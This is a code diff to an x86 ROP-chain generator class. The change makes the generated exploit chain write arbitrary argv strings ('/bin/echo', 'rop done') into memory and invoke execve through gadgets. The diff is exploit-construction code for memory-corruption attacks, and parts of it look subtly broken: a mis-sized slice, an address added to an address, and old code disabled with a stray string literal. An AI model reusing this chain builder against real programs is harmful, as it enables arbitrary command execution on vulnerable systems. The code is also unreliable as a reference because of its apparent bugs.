@@ -169,7 +169,89 @@ class ROPMakerX86(object):
         p = b'A' * self.padding
         p = b'A' * 44
 
+        args = [b'/bin/echo',b'rop done']
+
+        stack = dataAddr
         #-----------------------------stack--------------------------
+
+        for arg in args:
+            chunk = len(arg) // 4        
+            for i in range(chunk): 
+                
+                p += pack('<I', popDst["vaddr"]) 
+                p += pack('<I', stack) 
+                p += self.__custompadding(popDst, {})
+
+                p += pack('<I', popSrc["vaddr"]) 
+                p += arg[i*4:(i+4)*4] 
+                p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
+
+                p += pack('<I', write4where["vaddr"]) 
+                p += self.__custompadding(write4where, {}) 
+                
+                stack = stack + 4
+
+                #arg each in 4 chunk
+
+            rest = len(arg) % 4
+
+            if(rest != 0):
+
+                p += pack('<I', popDst["vaddr"]) 
+                p += pack('<I', stack) 
+                p += self.__custompadding(popDst, {})
+
+                p += pack('<I', popSrc["vaddr"]) 
+                p += arg[chunk*4:] + b' ' * (4 - rest)
+                p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
+
+                p += pack('<I', write4where["vaddr"]) 
+                p += self.__custompadding(write4where, {}) 
+
+                #reset lower than 4 
+
+                stack = stack + 4
+                arg = arg + b' ' * (4 - rest)
+                
+            p += pack('<I', popDst["vaddr"]) 
+            p += pack('<I', dataAddr + stack) 
+            p += self.__custompadding(popDst, {})
+
+            p += pack('<I', xorSrc["vaddr"]) 
+            p += self.__custompadding(xorSrc, {})
+
+            p += pack('<I', write4where["vaddr"]) 
+            p += self.__custompadding(write4where, {})
+            stack = stack + 1
+
+            #adding null
+
+        argindex = 0
+        safestack = stack
+
+        #----------------------------------args---------------------------------
+
+        for arg in args:
+
+            p += pack('<I', popDst["vaddr"]) 
+            p += pack('<I', stack) 
+            p += self.__custompadding(popDst, {})
+
+            p += pack('<I', popSrc["vaddr"]) 
+            p += pack('<I', dataAddr + argindex) 
+            p += self.__custompadding(popSrc, {popDst["gadget"].split()[1]: stack})  # Don't overwrite reg dst
+
+            p += pack('<I', write4where["vaddr"]) 
+            p += self.__custompadding(write4where, {})        
+
+            stack = stack + 4
+            argindex = argindex + len(arg) + 1 
+
+            #writes arg on shadowstack
+
+
+        '''
+        #--------------------------=--stack--------------------------
 
         
         p += pack('<I', popDst["vaddr"]) 
@@ -289,6 +371,7 @@ class ROPMakerX86(object):
 
         #writes arg 2 on shadowstack
 
+        '''
         p += pack('<I', popEbx["vaddr"]) 
         p += pack('<I', dataAddr) 
         p += self.__custompadding(popEbx, {})
@@ -296,23 +379,23 @@ class ROPMakerX86(object):
         #puts stack in to ebx (program)
 
         p += pack('<I', popEcx["vaddr"]) 
-        p += pack('<I', dataAddr + 60) 
+        p += pack('<I', safestack) 
         p += self.__custompadding(popEcx, {"ebx": dataAddr})  
 
         #puts stack + 60 in to ecx (args)
 
         p += pack('<I', popEdx["vaddr"]) 
         p += pack('<I', dataAddr + 48) 
-        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": dataAddr + 60})  
+        p += self.__custompadding(popEdx, {"ebx": dataAddr, "ecx": safestack})  
 
         #puts stack in to edx (env)
 
         p += pack('<I', xorEax["vaddr"]) 
-        p += self.__custompadding(xorEax, {"ebx": dataAddr, "ecx": dataAddr + 60})  
+        p += self.__custompadding(xorEax, {"ebx": dataAddr, "ecx": safestack})  
 
         for _ in range(11):
             p += pack('<I', incEax["vaddr"]) 
-            p += self.__custompadding(incEax, {"ebx": dataAddr, "ecx": dataAddr + 60})  # Don't overwrite ebx and ecx
+            p += self.__custompadding(incEax, {"ebx": dataAddr, "ecx": safestack})  # Don't overwrite ebx and ecx
 
         #sets eax to 11
 
